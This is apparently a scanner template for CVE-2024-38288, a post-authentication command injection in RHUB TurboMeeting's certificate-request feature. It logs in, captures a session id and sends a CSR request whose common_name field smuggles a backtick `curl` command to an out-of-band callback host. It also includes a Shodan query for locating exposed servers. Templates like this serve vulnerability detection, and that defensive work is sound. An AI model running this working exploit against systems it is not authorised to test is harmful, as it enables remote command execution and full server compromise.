flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: sid
    part: body
    regex:
    - sid=(.*?)"
    type: regex
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - as/wapi/profile_entry?sid=
  raw:
  - 'POST /as/wapi/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    next_path=%2Fas%2Fwapi%2Fprofile_entry&Email={{username}}&Password={{password}}&submit=Login

    '
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - CSR
    - SSL
  - part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: and
  raw:
  - '@timeout: 20s

    POST /as/wapi/generate_csr HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    sid={{sid}}&common_name=1"%20out%20/dev/null"`curl%20{{interactsh-url}}`&company_name=1&state=1&city=1&country=US&submit=Generate+CSR

    '
id: CVE-2024-38288
info:
  author: rootxharsh,iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:rhubcom:turbomeeting:*:*:*:*:*:*:*:*
    epss-percentile: 0.98545
    epss-score: 0.68544
  description: 'The Certificate Signing Request (CSR) feature in the admin portal
    of the application is vulnerable to command injection. This vulnerability could
    allow authenticated admin users to execute arbitrary commands on the underlying
    server by injecting malicious input into the CSR generation process. The application
    failed to properly sanitize user-supplied input before using it in a command executed
    privileges.

    '
  impact: 'Authenticated admin users can execute arbitrary OS commands on the TurboMeeting
    server through malicious CSR input, leading to complete system compromise and
    potential access to all meeting data.

    '
  metadata:
    max-request: 2
    product: turbomeeting
    shodan-query: html:"TurboMeeting"
    vendor: rhubcom
    verified: true
  name: TurboMeeting - Post-Authentication Command Injection
  reference:
  - https://github.com/google/security-research/security/advisories/GHSA-gx6g-8mvx-3q5c
  - https://www.rhubcom.com/v5/manuals.html
  remediation: 'Upgrade to the latest patched version of RHUB TurboMeeting or apply
    vendor-provided security updates.

    '
  severity: high
  tags: cve,cve2024,rce,turbomeeting,authenticated,vuln
variables:
  password: '{{password}}'
  username: '{{username}}'
